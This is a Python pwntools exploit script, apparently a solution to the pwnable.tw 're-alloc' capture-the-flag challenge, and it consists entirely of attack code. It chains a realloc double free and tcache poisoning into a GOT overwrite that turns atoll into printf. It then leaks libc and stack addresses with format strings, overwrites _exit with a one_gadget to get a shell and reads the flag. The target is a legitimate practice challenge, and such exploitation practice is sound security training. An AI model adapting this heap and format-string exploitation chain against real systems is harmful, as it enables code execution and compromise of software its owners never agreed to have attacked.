#!/usr/bin/env python3

from pwn import *

exe = ELF("./re-alloc_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.29.so", checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x000000000040129D
            b* 0x000000000040176D
            c
            set follow-fork-mode parent
            ''')
            
if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("chall.pwnable.tw", 10106)

def allocate(idx, size, data):
    p.sendlineafter(b'choice: ', str(1))
    p.sendafter(b'Index:', str(idx))
    p.sendafter(b'Size:', str(size))
    p.sendafter(b'Data:', data)

def reallocate(idx, size, data):
    p.sendlineafter(b'choice: ', str(2))
    p.sendafter(b'Index:', str(idx))
    p.sendafter(b'Size:', str(size))

    if size == 0:
        return

    p.sendafter(b'Data:', data)

def rfree(idx):
    p.sendlineafter(b'choice: ', str(3))
    p.sendafter(b'Index:', str(idx))

def fmt_write(idx, val):
    p.sendlineafter(b'choice: ', str(2))
    p.sendafter(b'Index:', f'%{val}c%{idx}$hhn'.ljust(16))

# Double free
allocate(0, 0x18, b'a'*8)
reallocate(0, 0, b'')
reallocate(0, 0x18, b'a'*16)
rfree(0) # heap <- heap
allocate(0, 0x18, p64(exe.got.atoll)) # heap -> atoll

# !heap[1]
allocate(1, 0x18, b'a'*8) # atoll
reallocate(1, 0x28, b'b'*8) # heap[0] && heap[1] -> remove heap[1]
rfree(1)
allocate(1, 0x18, p64(exe.plt.printf))

# Leak libc
p.sendlineafter(b'choice: ', str(2))
p.sendafter(b'Index:', b'%6$p')

libc_leak = int(p.recvuntil(b'Invalid !', drop=True), 16)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
print("Libc base: " + hex(libc.address))

# Leak stack
p.sendlineafter(b'choice: ', str(2))
p.sendafter(b'Index:', b'%18$p')

stack_leak = int(p.recvuntil(b'Invalid !', drop=True), 16)
print("Stack leak: " + hex(stack_leak))

# overwrite exit on stack_leak
for i in range(3):
    fmt_write(12, (stack_leak & 0xff) + i)
    fmt_write(18, exe.got._exit >> 8*i & 0xff)

# return
fmt_write(12, stack_leak & 0xff)

gadget = [0xe21ce, 0xe21d1, 0xe21d4, 0xe237f, 0xe2383, 0x106ef8]
# overwrite system on exit
for i in range(6):
    fmt_write(18, (exe.got._exit & 0xff) + i)
    fmt_write(22, (gadget[1] + libc.address) >> 8*i & 0xff)

p.sendlineafter(b'choice: ', str(4))
p.sendline(b'cat /home/re-alloc/flag')

p.interactive()